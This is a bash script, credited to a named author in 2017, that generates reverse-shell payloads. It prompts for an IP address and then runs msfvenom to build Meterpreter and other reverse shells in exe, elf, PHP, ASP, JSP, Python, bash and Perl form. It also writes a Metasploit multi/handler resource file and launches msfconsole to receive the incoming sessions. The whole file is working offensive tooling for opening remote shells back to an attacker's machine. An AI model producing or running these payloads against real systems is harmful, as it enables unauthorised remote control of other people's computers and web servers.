#!/bin/bash
#Payload Generator by Jordan Williams 2017
echo Welcome to Jordans Payload Generator
echo what is your IP?
read IP
echo Your IP is $IP
echo creating payloads
mkdir $IP
cd $IP

# Binaries Payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=445 -f exe > shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=22 -f elf >shell.elf
# Web Payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=$IP LPORT=80 R > exploit.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=445 -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=8080 -f raw > shell.jsp

# Scripting Payloads
msfvenom -p cmd/unix/reverse_python LHOST=$IP LPORT=4001 -f raw > shell.py
msfvenom -p cmd/unix/reverse_bash LHOST=$IP LPORT=4002 -f raw > shell.sh
msfvenom -p cmd/unix/reverse_perl LHOST=$IP LPORT=4003 -f raw > shell.pl

echo Finished creating Payloads
ls

# Create payload_Listner for Payloads
touch payload_listener.rc
echo use exploit/multi/handler >> payload_listener.rc
echo set ExitOnSession false >> payload_listener.rc
echo set LHOST $IP >> payload_listener.rc

echo set PAYLOAD windows/meterpreter/reverse_tcp >> payload_listener.rc
echo set LPORT 445 >> payload_listener.rc
echo exploit -j -z >> payload_listener.rc

echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> payload_listener.rc
echo set LPORT 22 >> payload_listener.rc
echo exploit -j -z >> payload_listener.rc

echo set PAYLOAD php/meterpreter/reverse_tcp >> payload_listener.rc
echo set LPORT 80 >> payload_listener.rc
echo exploit -j -z >> payload_listener.rc

echo set PAYLOAD java/jsp_shell_reverse_tcp >> payload_listener.rc
echo set LPORT 8080 >> payload_listener.rc
echo exploit -j -z >> payload_listener.rc

echo set PAYLOAD cmd/unix/reverse_python >> payload_listener.rc
echo set LPORT 4001 >> payload_listener.rc
echo exploit -j -z >> payload_listener.rc
echo set PAYLOAD cmd/unix/reverse_bash >> payload_listener.rc
echo set LPORT 4002 >> payload_listener.rc
echo exploit -j -z >> payload_listener.rc
echo set PAYLOAD cmd/unix/reverse_perl >> payload_listener.rc
echo set LPORT 4003 >> payload_listener.rc
echo exploit -j -z >> payload_listener.rc

#Run metasploit & load listeners
echo Starting metasploit 
sudo msfconsole -r payload_listener.rc